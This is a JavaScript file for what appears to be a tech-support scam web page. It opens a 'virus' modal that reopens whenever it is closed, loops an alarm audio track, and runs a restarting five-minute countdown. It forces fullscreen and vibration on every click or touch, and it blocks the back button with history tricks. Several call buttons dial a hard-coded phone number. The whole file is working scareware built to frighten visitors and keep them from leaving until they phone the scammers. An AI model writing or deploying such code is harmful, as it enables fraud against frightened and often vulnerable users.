$(document).ready(() => {
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById(
        "countdown-timer"
      ).innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // When the countdown reaches 0, restart the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  audioPlayer.play();

  audioPlayer.addEventListener("ended", () => {
    audioPlayer.play();
  });

  // Function to handle fullscreen and vibrate
  function goFullScreenAndVibrate() {
    const element = document.documentElement;

    // Fullscreen support for iOS and other platforms
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen(); // Safari on iOS
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen();
    }

    // Ensure vibration
    if (navigator.vibrate) {
      navigator.vibrate(200);
    }

    // For iOS Safari: Scroll to the top and resize to simulate fullscreen
    if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
      window.scrollTo(0, 0);
      document.body.style.height = "100vh";
      document.body.style.overflow = "hidden";
    }

    modalInstance.show();
  }

  // Modal event listeners
  if (virusModal) {
    virusModal.addEventListener("show.bs.modal", () => {
      goFullScreenAndVibrate();
      audioPlayer.play();

      audioPlayer.addEventListener("ended", () => {
        audioPlayer.play();
      });
    });

    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3 second delay
    });
  }

  // Handle user interaction for fullscreen
  window.addEventListener("touchstart", goFullScreenAndVibrate);
  window.addEventListener("click", goFullScreenAndVibrate);

  // Button event listeners
  $("#vibrateButton").on("click", () => {
    goFullScreenAndVibrate();
  });

  $("#callButton, #callButton1, #callButton2").on("click", () => {
    // Replace with the desired phone number
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent the backspace key from navigating back.
  history.pushState(null, null, window.location.href);
  history.back();
  window.onpopstate = () => history.forward();
});
